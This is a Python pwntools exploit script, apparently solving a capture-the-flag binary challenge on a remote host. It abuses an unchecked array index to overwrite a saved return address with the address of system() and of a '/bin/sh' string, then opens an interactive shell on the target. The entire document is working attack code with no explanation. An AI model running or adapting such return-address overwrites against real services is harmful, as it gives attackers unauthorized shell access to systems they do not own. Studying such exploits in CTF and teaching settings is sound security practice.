from pwn import *
 
def write_addr(index,value,io):
    io.sendline("3")
    io.sendlineafter("which number to change:\n",str(index))
    io.sendlineafter("new number:\n",str(value))
 
 
io = remote("61.147.171.105",56825)
 
addr_buf=0xffffcec8
addr_ret=0xffffcf4c
index = addr_ret - addr_buf
 
addr_sys = [0x50,0x84,0x04,0x08]
addr_sh = [0x87,0x89,0x04,0x08]
 
io.sendlineafter("How many numbers you have:\n","1")
io.sendlineafter("Give me your numbers\n","1")
 
for i in range(4):
    write_addr(index,addr_sys[i],io)
    index = index+1
 
for i in range(4):
    write_addr(index,addr_sys[i],io)
    index = index+1
 
for i in range(4):
    write_addr(index,addr_sh[i],io)
    index = index+1
 
io.sendline("5")
io.interactive()
 
 